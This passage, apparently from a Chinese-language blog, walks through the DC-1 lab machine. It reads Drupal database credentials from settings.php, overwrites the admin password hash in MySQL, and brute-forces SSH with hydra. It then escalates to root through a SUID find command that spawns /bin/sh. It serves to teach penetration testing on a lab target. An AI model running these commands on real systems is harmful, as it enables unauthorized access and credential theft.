+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /var/www/sites/default/settings.php<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911742361.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>直接就得到了数据库的相关信息，包括用户名和密码等。与此同时也得到了flag2的相关提示信息。</p>
+<p>继续查看第三个文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /var/www/sites/default/default.settings.php<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911885892.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>多为注释，没啥实质性有用的信息。</p>
+<p>根据第二个文件获取到的数据库相关信息，尝试登陆数据库，查看其中的数据。并尝试获取登陆的<code>用户名</code>和<code>密码</code>：</p>
+<p>- </p>
+<p>使用MYSQL命令之前需要先确保它的服务已经开启，并且已经启动。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">systemctl status mysql    // 检查状态<br>systemctl start mysql     // 启动服务<br></code></pre></td></tr></table></figure>
+
+<p>未开启服务的时候返回的响应信息如果指向的是MariaDB服务未启动。</p>
+<p>使用命令设置MariaDB自启动：（系统下次启动时就会自动启动它）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo systemctl <span class="hljs-built_in">enable</span> mariadb<br></code></pre></td></tr></table></figure>
+
+<p>- </p>
+<p>尝试执行数据库登陆命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql -udbuser -pR0ck3t<br></code></pre></td></tr></table></figure>
+
+<p>用户名是<code>dbuser</code></p>
+<p>密码是<code>R0ck3t</code></p>
+<p>返回响应信息如下，表示成功登陆了数据库：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911929825.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>查看数据库的内容：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">show databases;<br>（分号是必须要加的）<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721912100696.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>有两个数据库，一个是记录当前数据库系统中所有元数据的记录文件，另一个是drupaldb数据库。</p>
+<p>接下来查看数据库中的表名：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">use drupaldb;<br><br>show tables;<br><br></code></pre></td></tr></table></figure>
+
+<p>注意，分号也是需要的哦。</p>
+<p>得到如下结果：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721912152617.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721912172891.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>根据表名，我们可以发现数据库中含有一个表名为<code>user</code>的表，里面应该会有一些信息。</p>
+<p>接下来查看该表的内容：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span>;<br></code></pre></td></tr></table></figure>
+
+<p>得到如下结果：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721912205136.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>其中的name应该表示的是用户名，pass表示的是对应的密码。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721912238522.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>但是细看pass，都是经过加密保护的数据：</p>
+<blockquote>
+<p>数据库中的密码一般采用的是hash加密。因此关于数据库加密密码的破解可以通过一些hash加密脚本进行切入。</p>
+</blockquote>
+<p>输入命令：（需要先退出，切换为交互界面哦~）</p>
+<p>退出后的切换命令：<code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name *<span class="hljs-built_in">hash</span>*<br></code></pre></td></tr></table></figure>
+
+<p>查询得到的结果很多：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721912450355.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>通过查看文件命名，可以发现存在一个名为：<code>password-hash.sh</code>的文件，初步判断其应该是我们要找的hash加密脚本。读取该脚本寻找其使用方法。</p>
+<blockquote>
+<p>.sh后缀的文件一般是shell脚本文件。用于在linux系统中执行一些自动化任务或者命令序列。</p>
+</blockquote>
+<p>读取加密脚本：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /var/www/scripts/password-hash.sh<br></code></pre></td></tr></table></figure>
+
+<p>得到结果（一些关键信息如下）：</p>
+<p>比如，使用说明和帮助信息：支持‘–root’选项，用于将工作目录切换到drupal安装目录。所有的明文密码都必须使用双引号括起来。</p>
+<p>“ One or more plan-text passwords enclosed by double quotes.”</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721912499494.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>得知这个信息之后，我们可以利用这个加密脚本中的加密方法构造一个已知用户名对应的对我们而言已知的新密码。进而替换users表格中的对象。</p>
+<p>修改目标：将用户名为admin的密码修改为’admin‘</p>
+<p>运行命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php /var/www/scripts/password-hash.sh admin<br></code></pre></td></tr></table></figure>
+
+<p>注：该条命令的意思是，运行该.sh脚本，生成明文密码是“admin”的hash加密密码值。</p>
+<p><strong>plain-pass</strong>：admin</p>
+<p><strong>encrypt-hash-pass：</strong></p>
+<p>$S$DwaP8RG77fiZwwCdr0LjW4BhdYIczowL4XnwXBg47LvTossBwdji</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721912714433.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>接下来就是回到数据库中将用户名为“admin”的密码改为我们新生成的hash密码值，即修改admin用户的密码为’admin‘。</p>
+<p>mysql -udbuser -pR0ck3t</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">use drupaldb;<br>update <span class="hljs-built_in">users</span> <span class="hljs-built_in">set</span> pass=<span class="hljs-string">&quot;$S<span class="hljs-variable">$DwaP8RG77fiZwwCdr0LjW4BhdYIczowL4XnwXBg47LvTossBwdji</span>&quot;</span> <span class="hljs-built_in">where</span> name=<span class="hljs-string">&quot;admin&quot;</span> or name=<span class="hljs-string">&quot;Fred&quot;</span>;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721912949408.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>验证是否成功修改，<code>select * from users；</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913292131.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>- </p>
+<p>退出mysql命令行使用<code>exit</code><br><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913312573.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>- </p>
+<p>使用”name：admin，pass：admin“去登陆目标ip网页。得到如下结果：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913355053.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>然后我们选择上方的”content“点击，查看其内容：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913389424.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>发现有个”flag3“，点击，得到如下效果：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913374497.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>访问文件<code>/etc/passwd</code>获取相关系统用户信息：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/passwd<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913409356.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>解释：&#x2F;etc&#x2F;passwd文件中的每条信息包含了多个字段，各个字段之间使用冒号分隔开来。</p>
+<blockquote>
+<p>显示字段的语法：</p>
+<p>用户名：密码占位符（通常是’x‘）：用户ID（UID）：组ID（GID）：用户描述：家目录：登陆shell</p>
+</blockquote>
+<p>接下来尝试访问<code>/etc/shadow</code>文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/shadow<br></code></pre></td></tr></table></figure>
+
+<p>由结果发现，由于权限不足，文件访问遭到拒绝：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240619125252692.png" srcset="/img/loading.gif" lazyload alt="image-20240619125252692"></p>
+<p>解释：&#x2F;etc&#x2F;shadow文件一般用于存储系统用户的加密密码及其相关的安全设置，通常只有系统管理员可以访问。</p>
+<blockquote>
+<p>显示字段的语法：（各字段使用冒号分隔）</p>
+<p>用户名：加密密码：上次密码更改日期：密码更改最短间隔：密码更改最长间隔：密码过期警告天数：账户失效日期：保留字段</p>
+<p>其中，加密密码通常使用的是’bcrypt’’SHA-256’或’SHA-512’等强哈希算法加密。</p>
+</blockquote>
+<p>回看上述获取的系统用户信息，发现近开头处有一个名为<code>root</code>的用户（doge&#x2F;），尝试使用字典爆破，看看能不能直接同时拿到登陆数据和提权。</p>
+<p>切换回kali的root用户，使用hydra进行密码字典爆破：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.204.129<br></code></pre></td></tr></table></figure>
+
+<p>实际上，爆破的时间很长，而且，好像看不到结果（如下），所以想通过直接爆破root来获取登陆数据和实现提权是不大现实的。<br><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913636136.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>再看！近末尾处存在一个用户名为<code>flag4</code>的用户（为什么选中它就是！因为flag这个单词很熟，而且通常包含了关键信息）。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913619371.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -l flag4 -P /usr/share/wordlists/rockyou.txt ssh://192.168.204.129<br></code></pre></td></tr></table></figure>
+
+<p>很快地，就爆破出了这个用户的ssh登陆密码：</p>
+<blockquote>
+<p>flag4</p>
+<p>orange</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913790835.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<blockquote>
+<p>hydra（密码破解工具）使用语法：</p>
+<p>hydra -l 单个用户名 -p 密码字典表 -e 超时重试次数 -t count -M file -T count1 -o outputfile -f pass1 -c t1 -w t2 -C t3 -R t4 -s 指定端口号 -x    -SuvVd46 其它选项 服务:&#x2F;&#x2F;服务：端口</p>
+</blockquote>
+<p>- </p>
+<p><code>[-l LOGIN|-L FILE]</code>：指定单个用户名 <code>-l</code> 或从文件中读取用户名列表 <code>-L</code>。</p>
+<p><code>[-p PASS|-P FILE]</code>：指定单个密码 <code>-p</code> 或从文件中读取密码列表 <code>-P</code>。</p>
+<p><code>[-e ns]</code>：设置错误和超时的重试次数，默认为 5 次错误和 20 秒的超时。</p>
+<p><code>[-t TASKS]</code>：同时运行的任务数，默认为 16。</p>
+<p><code>[-M FILE]</code>：启用并行模式，从文件中读取主机列表。</p>
+<p><code>[-T TASKS]</code>：每个主机并行任务数，默认为 16。</p>
+<p><code>[-o FILE]</code>：将结果输出到文件。</p>
+<p><code>[-f]</code>：强制使用指定的密码，即使它不工作。</p>
+<p><code>[-c TIME]</code>：等待连接超时时间，默认为 30 秒。</p>
+<p><code>[-w TIME]</code>：等待响应超时时间，默认为 30 秒。</p>
+<p><code>[-C TIME]</code>：每个连接的间隔时间，默认为 0 秒。</p>
+<p><code>[-R TIME]</code>：等待任务切换时间，默认为 0 秒。</p>
+<p><code>[-s PORT]</code>：连接到指定端口，默认为服务的标准端口。</p>
+<p><code>[-x MIN:MAX:CHARSET]</code>：使用指定的字符集生成密码。</p>
+<p><code>[-SuvVd46]</code>：其他选项，例如静默模式 <code>-S</code>、详细输出 <code>-v</code>、非详细输出 <code>-V</code>、调试输出 <code>-d</code>、IPv6 支持 <code>-6</code> 等。</p>
+<p><code>[service://server[:PORT][/OPT]]</code>：指定目标服务的协议、服务器地址和端口，以及可选的参数。</p>
+<p>- </p>
+<p>ok！登陆权限拿到！</p>
+<p>返回靶机尝试登陆，发现能够成功以flag4用户的身份登陆。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913908123.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h3 id="2、提权"><a href="#2、提权" class="headerlink" title="2、提权"></a>2、提权</h3><p>接下来进行提权，以获得更多有用的信息。</p>
+<p>首先先使用<code>find</code>命令，查找具有SUID权限（拥有者&#x2F;管理者权限）的可执行二进制文件（通俗点理解就是命令，比如find这种）。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure>
+
+<p>查找结果如下：</p>
+<p>由查找结果可以发现，find命令也具有SUID权限，因而可以通过它实现提权。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913930750.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>输入命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name index.php -<span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;/bin/sh&quot;</span> \;<br></code></pre></td></tr></table></figure>
+
+<p>解释：命令意思是，使用find命令，通过执行 “&#x2F;bin&#x2F;sh”文件来查找名为index.php的文件。其中，查找什么文件不重要，关键是使用具有<code>SUID权限</code>的命令去调用执行<code>-exec &quot;/bin/sh&quot;</code>。</p>
+<p>（注意末尾的符号也需要！而且需要有个空格！！！）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913967593.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<blockquote>
+<p>&#x2F;bin&#x2F;sh文件：<br>是系统默认的命令行解释器，通常被称为’shell‘</p>
+</blockquote>
+<p>成功提权！此时也可以访问<code>/etc/shadow</code>（密码）文件了。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913992790.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>结束。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>DC1靶场攻打过程中使用到的相关关键操作技术：、</p>
+<ul>
+<li><p>首先先进行信息收集。使用<code>nmap</code>端口扫描收集开放端口信息。通过端口信息试图获取目标靶场的相关信息，比如所使用的框架等。</p>
+</li>
+<li><p>利用<code>msfconsole</code>寻找有关drupal CMS框架的漏洞，并利用漏洞重置<code>RHOSTS</code>字段值为目标靶机值，使用<code>run/exploit</code>命令执行。</p>
+</li>
+<li><p>获取shell，同样是通过<code>msfconsole</code>实现，输入<code>shell  -&gt;  ls</code>看是否成功列出目录文件，成功则表示get shell成功。输入命令<code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code>开启用户交互界面（即以靶机用户身份进行后续操作）</p>
+</li>
+<li><p>搜索靶机框架的配置文件名，搜索其下的所有相关配置文件，并<code>cat</code>查看文件内容，试图从中获取有用的信息。</p>
+</li>
+<li><p>获取数据库内容之后，使用命令<code>mysql -uName -pPassword</code>尝试登陆。</p>
+</li>
+<li><p>使用hydra进行密码爆破</p>
+</li>
+<li><p>提权，首先需要查找有SUID权限的命令，<code>find / -perm -u=s -type f 2&gt;/dev/null</code>，然后执行<code>（SUID） / -name index.php -exec &quot;/bin/sh&quot; \;</code>进行提权。</p>
+</li>
+<li><p>检测权限属主的命令为<code>whoami和id</code></p>
+</li>
+</ul>
+
                 
               </div>
             
